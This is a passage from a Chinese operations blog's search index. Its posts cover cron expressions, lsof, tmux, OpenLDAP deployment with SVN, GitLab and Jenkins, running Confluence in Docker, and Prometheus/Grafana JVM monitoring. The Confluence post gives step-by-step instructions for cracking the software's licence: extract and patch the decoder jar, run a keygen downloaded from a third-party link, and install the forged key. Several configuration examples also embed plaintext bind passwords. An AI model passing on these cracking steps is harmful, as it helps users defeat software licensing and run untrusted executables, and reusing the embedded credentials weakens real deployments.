* 14 * * ? 每天下午的 2点到2点59分每分触发0 0/5 14 * * ? 每天下午的 2点到2点59分(整点开始，每隔5分触发)0 0/5 14,18 * * ? 每天下午的 2点到2点59分(整点开始，每隔5分触发)以及每天下午的 18点到18点59分(整点开始，每隔5分触发)0 0-5 14 * * ? 每天下午的 2点到2点05分每分触发0 10,44 14 ? 3 WED 3月分每周三下午的 2点10分和2点44分触发 （特殊情况，在一个时间设置里，执行两次或 两次以上的情况）0 59 2 ? * FRI 每周5凌晨2点59分触发；0 15 10 ? * MON-FRI 从周一到周五每天上午的10点15分触发0 15 10 15 * ? 每月15号上午10点15分触发0 15 10 L * ? 每月最后一天的10点15分触发0 15 10 ? * 6L 每月最后一周的星期五的10点15分触发0 15 10 ? * 6L 2002-2005 从2002年到2005年每月最后一周的星期五的10点15分触发0 15 10 ? * 6#3 每月的第三周的星期五开始触发0 0 12 1/5 * ? 每月的第一个中午开始每隔5天触发一次0 11 11 11 11 ? 每年的11月11号 11点11分触发(光棍节)]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[lsof文件句柄工具]]></title>
    <url>%2Farticles%2F6915627d.html</url>
    <content type="text"><![CDATA[简介在linux环境下，一切皆文件，通过文件不仅仅可以访问常规数据，还可以访问网络连接和硬件，如传输控制协议 (TCP) 和用户数据报协议 (UDP) 套接字等，系统在后台都为该应用程序分配了一个文件描述符，文件描述符提供了大量关于这个应用程序本身的信息。 参数：12345678910 -a 列出被打开的文件的进程列表-c&lt;进程名&gt; 列出指定进程所打开的文件-g 列出GID号进程详情-d&lt;文件号&gt; 列出占用该文件号的进程+d&lt;目录&gt; 列出目录下被打开的文件+D&lt;目录&gt; 递归列出目录下被打开的文件-n&lt;目录&gt; 列出使用NFS的文件-i&lt;条件&gt; 列出符合条件的进程。（4、6、协议、:端口、 @ip ）-p&lt;进程号&gt; 列出指定进程号所打开的文件-u 列出UID号进程详情 实例文件被哪些进程打开了123 root@lzjun:~# lsof -a /var/lib/mysql/mysql/slow_log.CSVCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEmysqld 29363 mysql 63r REG 253,1 0 263979 /var/lib/mysql/mysql/slow_log.CSV 列出用户打开的文件12345 root@lzjun:~# lsof -u root | moreCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEinit 1 root cwd DIR 253,1 4096 2 /init 1 root rtd DIR 253,1 4096 2 /init 1 root txt REG 253,1 167192 1048737 /sbin/init 列出程序（command）打开了哪些文件12345 root@lzjun:~# lsof -c pythonCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEpython 32280 root rtd DIR 253,1 4096 2 /python 32280 root mem REG 253,1 52120 927846 /lib/x86_64-linux-gnu/libnss_files-2.15.sopython 32280 root DEL REG 253,1 263953 /usr/lib/python2.7/lib-dynload/_multiprocessing.so 根据进程号列出该进程打开的文件12345 root@lzjun:~# lsof -p 31370 #nginx的进程号COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEnginx 31370 www-data cwd DIR 253,1 4096 2 /nginx 31370 www-data rtd DIR 253,1 4096 2 /nginx 31370 www-data txt REG 253,1 843688 1186644 /usr/sbin/nginx 查看所有网络连接，包括tcp，udp，ipv4,ipv6的连接（网络连接也是文件）123456 root@lzjun:~# lsof -iCOMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEpptpd 975 root 6u IPv4 8836 0t0 TCP *:1723 (LISTEN)ssserver 7366 root 4u IPv4 100096 0t0 TCP *:8388 (LISTEN)ssserver 7366 root 5u IPv4 100097 0t0 UDP *:8388ssserver 7366 root 7u IPv4 100098 0t0 UDP *:57935 查看某个端口打开的文件（socket 连接）123 root@lzjun:~# lsof -i :80COMMAND PID USER FD TYPE DEVICE SIZE/OFF NODE NAMEnginx 31369 root 6u IPv4 8882096 0t0 TCP *:http (LISTEN) 查看所有TCP连接1lsof -n -P -i TCP -s TCP:LISTEN]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[tmux参考手册]]></title>
    <url>%2Farticles%2Fa5e32f5.html</url>
    <content type="text"><![CDATA[tmux可以在一个屏幕中创建多个session，window，pane等，可以从一个屏幕中分离并继续在后台运行，以后可以重新连接。 Session控制:1`#直接创建session``tmux`` ``#查看session``tmux ``ls`` ``#创建名字为wkl39883的session``tmux new -s wkl39883`` ``#attach到名字为wkl39883的session``tmux a -t wkl39883`` ``#attch到session, 同时踢掉其他所有attac``tmux a -t wkl39883 -d`]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LDAP部署和第三方服务接入]]></title>
    <url>%2Farticles%2F543cefa7.html</url>
    <content type="text"><![CDATA[LDAP部署介绍可以通过以下三句话快速的认识一下LDAP： LDAP：Lightweight Directory Access Protocol，轻量目录访问协议。 LDAP服务是一个为只读（查询、浏览、搜索）访问而优化的非关系型数据库，呈树状结构组织数据。 LDAP主要用做用户信息查询（如邮箱、电话等）或对各种服务访问做后台认证以及用户数据权限管控。 名词解释 DC：domain component一般为公司名，例如：dc=163,dc=com OU：organization unit为组织单元，最多可以有四级，每级最长32个字符，可以为中文 CN：common name为用户名或者服务器名，最长可以到80个字符，可以为中文 DN：distinguished name为一条LDAP记录项的名字，有唯一性，例如：dc:”cn=admin,ou=developer,dc=163,dc=com” 图形示例上边来了一堆的名词解释，看的云里雾里，还不是很明白，怎么跟自己的组织架构对应起来呢？看看下边的图是不是清晰明了 部署部署环境：Debian 8.4 1.安装OpenLDAP,OpenLDAP服务端程序叫slapd 1# apt-get install -y slapd 2.安装完成之后，会自动生成一个OpenLDAP的系统账号 12# cat /etc/passwdopenldap:x:110:115:OpenLDAP Server Account,,,:/var/lib/ldap:/bin/false 3.生成OpenLDAP管理员账号的密码（后边修改配置文件需要使用） 1234# slappasswdNew password: Re-enter new password: &#123;SSHA&#125;EcAoXeGab5g8y2Y03EmH3+Zc3hJaHp7F 4.新建OpenLDAP配置文件 1234567# cp /usr/share/slapd/slapd.conf /etc/ldap/# 配置文件中有很多@xxx@的配置替换为真实配置# slaptest -f /etc/ldap/slapd.conf 5ad9b19d /etc/ldap/slapd.conf: line 105: rootdn is always granted unlimited privileges.5ad9b19d /etc/ldap/slapd.conf: line 122: rootdn is always granted unlimited privileges.config file testing succeeded 配置文件重要参数说明（需要自己修改的，其他未提到的可以不修改）： database bdb：定义使用的后端数据存储格式，数据库默认采用了berkeley db，其后可以跟的值有bdb、ldbm、passwd、shell。bdb指使用Berkley DB 4数据库 suffix &quot;dc=163,dc=com&quot;：suffix是”LDAP基准名”，它是LDAP名字空间在这里的根。设置想要创建的子树的根DN rootdn &quot;cn=admin,dc=163,dc=com&quot;：设置管理LDAP目录的超级用户的DN。这个用户名不要出现在/etc/passwd文件里 rootpw {SSHA}EcAoXeGab5g8y2Y03EmH3+Zc3hJaHp7F：设置这个数据库的超级用户的口令验证方式。也就是上边rootdn设置的用户的密码。一定要用加密的口令存储，可以使用的加密方式有：CRYPT、MD5、SMD5、SHA和SSHA，就是我们第三步生成的密码 directory /var/lib/ldap：设置LDAP数据库和索引文件所在的目录 access to：权限配置下边详细说明 5.删除原配置，生成新配置 12345# rm -rf /etc/ldap/slapd.d/*# slaptest -f /etc/ldap/slapd.conf -F /etc/ldap/slapd.d/# 给新生成的配置文件赋予OpenLdap的权限# chown -R openldap.openldap /etc/ldap/slapd.d/ 6.重启OpenLdap 1# /etc/init.d/slapd restart ACL权限控制ACL访问指令的格式： 12access to [what] by [who] [control] 简单解释：通过access to约束我们访问的范围（what），通过by设定哪个用户（who）有什么权限（control） ACL的详细配置还是比较复杂的，可以看下下边参考文档的第三篇，写的比较详细，这里都不再赘述。 线上ACL控制配置解析为了用户能够自主修改密码，部署了lam给用户使用（见下文lam介绍）。希望能达到的效果是： 管理员能够有全部权限，包含新建用户，修改用户属性，充值用户密码等 普通用户只能修改自己的密码，别的权限都没有 配置如下： 1234567891011121314151617181920# access to attrs=userPassword通过属性找到访问范围密码,# 超级管理员也就是我们ldap配置文件里写的rootdn："cn=admin,dc=163,dc=com"有写(write)权限；# 由于管理员可能不止一个，我创建了个管理员组"ou=Admin,dc=163,dc=com"把管理员统一都放到这个组下，管理员组下的所有用户（dn.children）有写权限；# 匿名用户(anonymous)要通过验证(auth);# 自己(self)有对自己密码的写（write）权限，其他人(*)都没有权限(none).access to attrs=userPassword,shadowLastChange by dn="cn=admin,dc=163,dc=com" write by dn.children="ou=Admin,dc=163,dc=com" write by anonymous auth by self write by * none# access to * 所有其他属性，# 超级管理员rootdn："cn=admin,dc=163,dc=com"有写(write)权限；# 管理员"ou=Admin,dc=163,dc=com"成员有写(write)权限；# 其他人(*)只有读(read)权限access to * by dn="cn=admin,dc=163,dc=com" write by dn.children="ou=Admin,dc=163,dc=com" write by * read 备份和还原备份1# ldapsearch -x -b "dc=163,dc=com" -D "uid=authz,ou=Public,dc=163,dc=com" -w "CzfdX629K7" &gt; ldap.20180626.ldif 参数说明： -x：进行简单的验证 -D：用来绑定服务器的DN -w：绑定DN的密码 -b：要查询的根节点authz账号要有&quot;dc=163,dc=com&quot;的查询权限 还原1# ldapadd -x -c -D "cn=admin,dc=163,dc=com" -w "smile" -f ldap.20180626.ldif 参数说明： -c：出错后继续执行程序不终止，默认出错即停止 -f：从文件内读取信息还原，而不是标准输入还原的DN最好为管理员账号，至少也要有要LDAP的写入权限 web管理工具安装1.安装ldap-account-management 1# apt-get install ldap-account-manager 2.浏览器访问 1http://ip/lam 配置lam的所有配置都可以在web端配置，不需要去服务器上修改一行代码，这个太好用了。 浏览器访问后进入登录页面，我们点击右上角”LAM configuratrion”来在线编辑配置文件 看到如下页面有两个选项：”Edit general settings”来编辑通用配置，默认密码lam，进入之后能配置密码策略、日志、管理员密码，最重要的是更新掉管理员密码，这个在后边”Manage server profiles”管理的时候需要提供；”Edit server profiles”来编辑服务器配置，我们先来编辑服务器配置 进入如下页面，输入默认密码lam即可编辑配置，这里要说明一下的是红框标注的”Manage server profiles”可以对服务器的配置文件进行配置，例如增加、删除配置文件、配置文件重命名，最重要的是可以设置配置文件密码（也就是我们刚输入的密码lam，但修改密码需要管理员密码，后边配置） 输入密码lam后就正式进入服务器配置页，看到第一个标签”General setting”，（可以先改下语言简体中文保存，整站就给汉化啦，英文渣渣看起来就非常方便了），基本配置都看的很清晰了，主要是Tree suffix配置为自己的DC可以了 接着来看这个页面，”security settings”非常重要，配置以何种方式登录web控制台，默认为Fixed list模式，就是下边列表里配置的dn可以登录，我们LDAP里还没有任何一个账号（当我们创建了账号之后可以选择”LDAP serch”的模式，让普通账号也能登录以修改自己的密码），这里要选择fixed list模式并配置为我们LDAP的rootdn，设置一个密码登录之后创建账号等操作 接下来就是”Account types”标签页的配置，这里配置我们登录web控制显示的标签，我这里只需要他显示用户，就把Group之类的都删除了，保留了User “Modules”页面配置上一个具体每个account type显示的模块 “Models setting”页面配置models具体要显示的内容，不得不说配置非常详细 经过上边的配置就可以进入控制台新建账号了，新建账号之前一个有用的操作是修改用户的默认RDN标致为uid，更高位置在登录web控制台后右上角配置文件编辑器里边 基本配置完成，可以开始使用了，中文界面比较清晰，无需过多解释啦。 SVN集成OpenLDAP认证 系统环境：Debian8.4 svn部署环境：Apache2.4 + Subversion Apache开启LDAP相关模块 12345678910# a2enmod ldapEnabling module ldap.To activate the new configuration, you need to run: service apache2 restart# a2enmod authnz_ldapConsidering dependency ldap for authnz_ldap:Module ldap already enabledEnabling module authnz_ldap.To activate the new configuration, you need to run: service apache2 restart 修改vhost配置文件，添加对ldap的支持 1234567891011121314151617181920212223242526&lt;Virtualhost *:8088&gt; DocumentRoot /home/svn/repos/ ServerName svn.domain.com &lt;Location /ne/&gt; DAV svn SVNListParentPath on SVNParentPath &quot;/home/svn/repos&quot; AuthType Basic AuthName &quot;Private Subversion Repository&quot; #AuthUserFile &quot;/etc/subversion/dav_svn.passwd&quot; AuthzSVNAccessFile &quot;/etc/subversion/dav_svn.authz&quot; # use LDAP auth AuthBasicProvider ldap AuthLDAPBindAuthoritative on AuthLDAPURL &quot;ldap://ldap.domain.com/dc=domain,dc=com?uid?sub?(objectclass=*)&quot; AuthLDAPBindDN &quot;uid=authz,ou=Public,dc=domain,dc=com&quot; AuthLDAPBindPassword &quot;CzfdX629K7&quot; Require ldap-user &lt;/Location&gt;&lt;/Virtualhost&gt; 主要LDAP配置文件详解：AuthType：验证类型，Basic使用账号密码验证 AuthName：提示字符串 AuthBasicProvider：使用ldap验证 AuthLDAPBindAuthoritative：on表示只要求验证ldap用户，别的不认，off则可以使用svn的账号和ldap混合账号登录 apache2.2中配置是AuthzLDAPAuthoritative，到2.4中改为了AuthLDAPBindAuthoritative 但在实际应用中发现并么有什么用，设置为off后ldap认证失败也不会去找AuthzSVNAccessFile，或许是我姿势不对，有知道原因的烦请告知 Require：ldap-user或valid-user AuthLDAPURL | AuthLDAPBindDN | AuthLDAPBindPassword： 用于查找用户的账号密码，一般设置个只读账号即可 AuthLDAPURL：[协议名称]://[ip地址或者域名]:[端口号]/[baseDN]?[attr]?[scope]?[filter] baseDN：指定开始搜索的节点的名称 attr：就是用户输入的属性键，默认是“uid” scope: one,sub,base，默认是sub filter：过滤器，默认是objectclass=* LDAP服务器认证过程可能只看配置文件不能了解LDAP认证的原理，接下来我们详细讨论下LDAP是如何认证的 客户端(httpd)使用提供的URL(AuthLDAPURL)进行验证的时候，并不是直接验证输入的账号密码，因为LDAP服务器在验证的时候要使用DN(每个节点用户的唯一标识)和密码来进行登陆验证的，但是DN一般来说比较长，诸如:“cn=xxx,ou=xxx,ou=xxx,dc=xxx,dc=xxx”，这种光输入的时候就烦死了，所以要想使用简短的用户名来登陆的时候，一般的做法是在某个节点用户上添加一个属性，比如mobile(手机号),Email(邮箱),user name或者uid(用户名),然后使用这个属性的值来登陆（大部分情况下都用uid，我们也是这么使用的）。 当用户输入这个属性值（一般uid）和密码的时候，客户端(httpd服务器)先使用AuthLDAPBindDN和AuthLDAPBindPassword作为用户名和密码登陆，根据AuthLDAPURL指定的查询规则来查找用户输入的属性的值有没有，如果查找的条数为0或者大于1，则返回错误，如果查找的条数等于1，则使用查找到的这个条目的DN和用户输入的密码进行登陆验证，成功则成功，失败则失败。 总结一下LDAP的认证过程分为两部： 搜索用户是否存在LDAP服务器中：配置文件中配置的AuthLDAPBindDN和AuthLDAPBindPassword两个属性主要目的就是为了登陆LDAP服务器搜索属性(uid)是否只有一条，如果服务器允许匿名访问则这两个配置可以不需要，但一般为了安全性都会关闭LDAP的匿名访问，新建一个只读权限的账号配置到这里即可 使用用户输入的属性值（uid）和密码进行登陆验证 GitLab集成OpenLDAP认证GitLab配置 修改配置文件gitlab.yml 12345678910111213141516171819202122ldap:enabled: trueservers: main: label: 'LDAP' host: 'ldap.domain.com' port: 389 uid: 'uid' method: 'plain' bind_dn: 'uid=authz,ou=Public,dc=domain,dc=com' password: 'CzfdX629K7' timeout: 10 active_directory: false allow_username_or_email_login: false block_auto_created_users: false base: 'dc=domain,dc=com' user_filter: '' 重启GitLab服务，看到页面已经有LDAP的登录选项了 重要配置参数解释仔细阅读上一篇svn集成LDAP认证的文章这些参数会更好理解 host：LDAP服务器地址 port：LDAP服务端口 uid：以哪个属性作为验证属性，可以为uid、cn等，我们使用uid method：如果开启了tls或ssl则填写对应的tls或ssl，都没有就填写plain bind_dn：search搜索账号信息的用户完整bind（需要一个有read权限的账号验证通过后搜索用户输入的用户名是否存在） password：bind_dn用户的密码，bind_dn和password两个参数登录LDAP服务器搜索用户 active_directory：LDAP服务是否是windows的AD，我们是用的OpenLDAP，这里写false allow_username_or_email_login：是否允许用户名或者邮箱认证，如果是则用户输入用户名或邮箱都可 base：从哪个位置搜索用户，例如允许登录GitLab的用户都在ou gitlab里，name这里可以写ou=gitlab,dc=domain,dc=com filter：添加过滤属性，例如只过滤employeeType为developer的用户进行认证，可以设置employeeType=developer Jenkins集成OpenLDAP认证安装LDAP插件使用LDAP认证需要安装LDAP插件，安装插件有两种方法： 方法一：后台插件管理里直接安装 优点：简单方便，不需要考虑插件依赖问题 缺点：因为网络等各种问题安装不成功 安装方法：登录Jenkins –&gt; 系统管理 –&gt; 插件管理 –&gt; 可选插件 –&gt; 搜索LDAP –&gt; 选中 –&gt; 直接安装 –&gt; 安装完成重启 因我们已经安装过了LDAP插件，所有这里搜索不到LDAP插件，只有LDAP Email插件 如果安装失败，网上也有说在插件管理 –&gt; 高级 –&gt; 升级站点里替换URL为https://mirrors.tuna.tsinghua.edu.cn/jenkins/updates/update-center.json的，但是我替换了之后依然没有成功，最后还是使用方法二安装成功的 方法二：官网下载安装文件后台上传 优点：一定可以安装成功的 缺点：麻烦，要去官网找插件并解决依赖 插件下载地址：https://updates.jenkins-ci.org/download/plugins/ 安装方法：官网下载插件 –&gt; 登录Jenkins –&gt; 系统管理 –&gt; 插件管理 –&gt; 高级 –&gt; 上传插件 –&gt; 选择文件 –&gt; 上传 –&gt; 安装完成后重启 上传插件安装可能会失败，大部分都是提示你当前插件依赖某些插件，只需要下载全部依赖插件，按照顺序上传安装即可，LDAP插件安装完成后，所有依赖的插件如下： 配置LDAP认证登录Jenkins –&gt; 系统管理 –&gt; 全局安全配置 访问控制选择“LDAP”，Server输入LDAP服务器地址，有其他配置可以点击“Advanced Server Configuration…” Server：服务器地址，可以直接填写LDAP服务器的主机名或IP，例如ldap.domain.com（默认端口389），或者ldap.domain.com:1389，如果用了SSL，可以填写ldaps://ldap.domain.com（默认端口636），或者ldaps://ldap.domain.com:1636 root DN：这里的root DN只是指搜索的根，并非LDAP服务器的root dn。由于LDAP数据库的数据组织结构类似一颗大树，而搜索是递归执行的，理论上，我们如果从子节点（而不是根节点）开始搜索，因为缩小了搜索范围那么就可以获得更高的性能。这里的root DN指的就是这个子节点的DN，当然也可以不填，表示从LDAP的根节点开始搜索 User search base：这个配置也是为了缩小LDAP搜索的范围，例如Jenkins系统只允许ou为Admin下的用户才能登陆，那么你这里可以填写ou=Admin，这是一个相对的值，相对于上边的root DN，例如你上边的root DN填写的是dc=domain,dc=com，那么user search base这里填写了ou=Admin，那么登陆用户去LDAP搜索时就只会搜索ou=Admin,dc=domain,dc=com下的用户了 User search filter：这个配置定义登陆的“用户名”对应LDAP中的哪个字段，如果你想用LDAP中的uid作为用户名来登录，那么这里可以配置为uid={0}（{0}会自动的替换为用户提交的用户名），如果你想用LDAP中的mail作为用户名来登录，那么这里就需要改为mail={0}。在测试的时候如果提示你user xxx does not exist，而你确定密码输入正确时，就要考虑下输入的用户名是不是这里定义的这个值了 Group search base：参考上边User search base解释 Group search filter：这个配置允许你将过滤器限制为所需的objectClass来提高搜索性能，也就是说可以只搜索用户属性中包含某个objectClass的用户，这就要求你对你的LDAP足够了解，一般我们也不配置 Group membership：没配置，没有详细研究 Manager DN：这个配置在你的LDAP服务器不允许匿名访问的情况下用来做认证（详细的认证过程参考文章LDAP落地实战（二）：SVN集成OpenLDAP认证中关于LDAP服务器认证过程的讲解），通常DN为cn=admin,dc=domain,dc=com这样 Manager Password：上边配置dn的密码 Display Name LDAP attribute：配置用户的显示名称，一般为显示名称就配置为uid，如果你想显示其他字段属性也可以这里配置，例如mail Email Address LDAP attribute：配置用户Email对应的字段属性，一般没有修改过的话都是mail，除非你用其他的字段属性来标识用户邮箱，这里可以配置 下边还有一些配置如：环境变量Environment Properties、servlet容器代理等，很少用就不多解释了。有一个配置Enable cache可能会用得到，当你的LDAP数据量很大或者LDAP服务器性能较差时，可以开启缓存，配置缓存条数和过期时间，那么在过期时间内新请求优先查找本地缓存认证，认证通过则不会去LDAP服务器请求，以减轻LDAP服务器的压力 配置完成后可以点击下方的“Test LDAP sttings”来测试配置的准确性 这里输入的用户名就是你上边配置的User search filter里定义的LDAP中的属性，密码就是LDAP的密码 登录配置完成并测试通过后就可以用LDAP直接登录了，注意：启用了LDAP登录后将无法再用之前的登录方式（例如本地认证）登录]]></content>
      <categories>
        <category>应用运维</category>
      </categories>
      <tags>
        <tag>Openldap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker中安装Wiki软件Confluence]]></title>
    <url>%2Farticles%2Fac0d3377.html</url>
    <content type="text"><![CDATA[目的本文通过在centos 7上Docker安装Wiki软件Confluence，并通过破解，让公司有一个稳定高效的文档平台。 安装dockeryum安装docker1`yum update ``# 更新yum``yum ``install` `docker ``# yum安装docker` 开启镜像加速由于国内网络问题拉取 Docker 镜像会十分缓慢，所以可以添加网易镜像地址：http://hub-mirror.c.163.com 加速。 1`vi` `/etc/docker/daemon``.json` 将其中的内容替换为如下，当然你可以添加其它镜像地址。 1`&#123;`` ``"registry-mirrors"``: [``"http://hub-mirror.c.163.com"``]``&#125;` 启动docker1`docker --version ``# 查看docker版本``service docker start ``# 启动docker``ps` `-ef | ``grep` `docker ``# 查看docker进程是否正常启动` 安装数据库PostgreSQL安装 PostgreSQL 所使用的镜像在：https://hub.docker.com/_/postgres/ 安装PostgreSQL1`docker run --name postgresdb -p 5432:5432 -e POSTGRES_PASSWORD=W**** -d postgres` 注： -p 5432:5432 选项是可选的，因为在后面启动Confluence容器的时候，postgresdb这个容器会以别名db连接到confluence容器，也就是说对confluence这个容器来说，可以通过db:5432的网络地址访问到postgresql服务，不需要在主机上开放5432端口。 W**** 是密码需要设置成你需要的密码 进入docker容器并创建confluence数据库1`docker ``exec` `-it postgresdb ``bash` `# 进入docker容器``psql -U postgres ``\l``CREATE DATABASE confluence WITH OWNER postgres; ``\q` 安装wiki Confluence下文中使用的镜像 https://hub.docker.com/r/cptactionhank/atlassian-confluence/ 也可以使用 https://github.com/jgrodziski/docker-confluence/blob/master/Dockerfile 这个镜像他把PostgreSQL和 Confluence包含在一个image里面，参考：http://blogs.atlassian.com/2013/11/docker-all-the-things-at-atlassian-automation-and-wiring/ 安装wiki Confluence1`docker run -d --name confluence -p 8090:8090 --link postgresdb:db --user root:root cptactionhank``/atlassian-confluence``:latest` 以上命令将在主机上开放8090端口，如果想使用80端口访问wiki请使用一下命令安装 1`docker run -d --name confluence -p 80:8090 --link postgresdb:db --user root:root cptactionhank``/atlassian-confluence``:latest` 检查confluence是否启动1`docker ``ps` `# 列出运行的容器` 可以看到刚才安装的两个容器，启动 wiki confluence 1`docker start postgresdb ``# 启动数据库 postgresdb``docker start confluence ``# 启动 Wiki confluence``docker ``ps` `# 列出运行的容器` 可以看到 wiki confluence已经启动 浏览器访问http://ip/就可以看到Confluence的配置页面 破解Confluence访问页面记录Server ID 停止 confluence1docker stop confluence #停止 confluence 容器 进入confluence 容器, 查找decoder.jar文件123docker exec -it confluence /bin/bash # 进入docker容器 confluencesu - # 切换到root账户find -name "*decoder*" # 查找名称中包括 decoder 的文件 将decoder.jar文件从容器中复制出来，其中 “confluence:” 是Wiki confluence容器名称，atlassian-extras-decoder-v2-3.3.0.jar 是安装版本wiki的decode文件 1`docker ``cp` `confluence:``/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3``.3.0.jar .` 破解 下载 atlassian-extras-decoder-v2-3.3.0.jar 文件到windows上 将文件名改为 “atlassian-extras-2.4.jar” 破解工具只识别这个文件名 下载破解文件 http://wiki.wuyijun.cn/download/attachments/2327034/51CTO%E4%B8%8B%E8%BD%BD-Confluence.zip 解压缩此文件夹，dos命令行进入此文件夹，目录需根据你的实际情况修改 C:\Users\lrs\Desktop\wiki\51CTO下载-Confluence\confluence5.1-crack\confluence5.1-crack\iNViSiBLE 执行 java -jar confluence_keygen.jar 运行破解文件 填入 name ，server id 处输入步骤1中得到的id，点击 “gen” 生成key 点击 patch，选择刚才改名为 “atlassian-extras-2.4.jar” 的jar包，显示 “jar success fully patched” 则破解成功 注意：path前先删除atlassian-extras-2.4.bak文件否则path失败 将 “atlassian-extras-2.4.jar” 文件名改回原来的 “atlassian-extras-decoder-v2-3.3.0.jar” 复制key中的内容备用 将 “atlassian-extras-decoder-v2-3.3.0.jar” 文件上传回服务器 将破解后的文件复制回 confluence 容器1`docker ``cp` `atlassian-extras-decoder-v2-3.3.0.jar confluence:``/opt/atlassian/confluence/confluence/WEB-INF/lib/atlassian-extras-decoder-v2-3``.3.0.jar` 启动 confluence 容器1docker start confluence 再次访问页面1http://ip 平台配置输入之前复制的key后点击下一步 点击 ”My own database“ 后点击 next 输入数据库连接信息，用户名密码是之前创建数据库中的用户名和密码注意：用户名为 postgres没有db 单击 ”Empty Site“ 点击 “Manage users and groups within Confluence” 填入管理员信息后点击 “next” 点击 ”start“ 设置一些信息后就完成了 查看授权信息，使用管理员用户登录 可以看到是评估版本，但过期时间是3千多个月后 解决慢时长gc的问题默认java配置为1G内存使用一段时间后回经常gc造成卡顿，单击“系统信息”可以看到jvm使用情况 进入docker容器 1docker exec -it confluence /bin/bash # 进入docker容器 confluence 修改java配置 1`vi` `/opt/atlassian/confluence/bin/catalina``.sh` 在 “cygwin=false” 上面添加如下内容，最大内存为2G 1`JAVA_OPTS=``"-Xms256m -Xmx2048m -XX:PermSize=128m -XX:MaxPermSize=512m"``或``CATALINA_OPTS=``"-Xms256m -Xmx2048m -XX:PermSize=128m -XX:MaxPermSize=512m"` 重启 wiki confluence 1`docker stop confluence ``# 停止``docker start confluence ``# 启动` 这时候可以看到内存为 2G 可用为 73%]]></content>
      <categories>
        <category>应用监控</category>
        <category>服务搭建</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Prometheus+Grafana监控JVM]]></title>
    <url>%2Farticles%2Ffd3e6049.html</url>
    <content type="text"><![CDATA[摘要工具： Docker，本文大量使用了Docker来启动各个应用。 Prometheus，负责抓取/存储指标信息，并提供查询功能。 Grafana，负责数据可视化。 JMX exporter，提供JMX中和JVM相关的metrics。 Tomcat，用来模拟一个Java应用。 步骤： 利用JMX exporter，在Java进程内启动一个小型的Http server 配置Prometheus抓取那个Http server提供的metrics。 配置Grafana连接Prometheus，配置Dashboard。 启动Java测试实例1) 新建一个目录，名字叫做prom-jvm-demo。 2) 下载JMX exporter到这个目录 3) 新建一个文件simple-config.yml内容如下： 123456789---lowercaseOutputLabelNames: truelowercaseOutputName: truewhitelistObjectNames: ["java.lang:type=OperatingSystem"]rules: - pattern: 'java.lang&lt;type=OperatingSystem&gt;&lt;&gt;((?!process_cpu_time)\w+):' name: os_$1 type: GAUGE attrNameSnakeCase: true 4) 运行以下命令启动3个Tomcat，记得把&lt;path-to-prom-jvm-demo&gt;替换成正确的路径： 1234567891011121314151617181920212223docker run -d \ --name tomcat-1 \ -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \ -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \ -p 6060:6060 \ -p 8080:8080 \ tomcat:8.5-alpinedocker run -d \ --name tomcat-2 \ -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \ -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \ -p 6061:6060 \ -p 8081:8080 \ tomcat:8.5-alpinedocker run -d \ --name tomcat-3 \ -v &lt;path-to-prom-jvm-demo&gt;:/jmx-exporter \ -e CATALINA_OPTS="-Xms64m -Xmx128m -javaagent:/jmx-exporter/jmx_prometheus_javaagent-0.3.1.jar=6060:/jmx-exporter/simple-config.yml" \ -p 6062:6060 \ -p 8082:8080 \ tomcat:8.5-alpine 5) 访问http://localhost:8080|8081|8082看看Tomcat是否启动成功。 6) 访问对应的http://localhost:6060|6061|6062看看JMX exporter提供的metrics。 备注：这里提供的simple-config.yml仅仅提供了JVM的信息，更复杂的配置请参考JMX exporter文档。 启动Prometheus1) 在之前新建目录prom-jvm-demo，新建一个文件prom-jmx.yml，内容如下： 12345678scrape_configs: - job_name: 'java' scrape_interval: 30s static_configs: - targets: - '&lt;host-ip&gt;:6060' - '&lt;host-ip&gt;:6061' - '&lt;host-ip&gt;:6062' 2) 启动Prometheus： 12345docker run -d \ --name=prometheus \ -p 9090:9090 \ -v &lt;path-to-prom-jvm-demo&gt;:/prometheus-config \ prom/prometheus --config.file=/prometheus-config/prom-jmx.yml 3) 访问http://localhost:9090看看Prometheus是否启动成功，在输入框里输入jvm_info然后执行，应该可以看到如下图的结果： 如果没有看到三个instance，那么等一会儿再试。 启动Grafana1) 启动Grafana： 1docker run -d --name=grafana -p 3000:3000 grafana/grafana 2) 访问http://localhost:3000，使用admin/admin登录。 3) 添加Prometheus数据源，如下图所示到添加数据源页面： 4) 配置数据源信息： Name：随便取 Type：Prometheus URL：http://&lt;host-ip&gt;:9090 其余不要设置，点击Save &amp; Test，应该会返回成功结果 5) 导入Dashboard。我们不需要重头自己做Dashboard，用现成的就行，按下图所示进入导入页面 6) 使用我制作的JVM Dashboard，页面右侧出现的ID号是8563，记住这个号，填在如下图所示的位置： 7) 然后鼠标点击别处稍等一下，出现下图，选择一下数据源就可以了 8) 最后打开刚刚导入的Dashboard，如下图：]]></content>
      <categories>
        <category>应用运维</category>
        <category>监控积累</category>
      </categories>
      <tags>
        <tag>Prometheus</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gitlab安装配置手册(Docker版)]]></title>
    <url>%2Farticles%2F87b11c95.html</url>
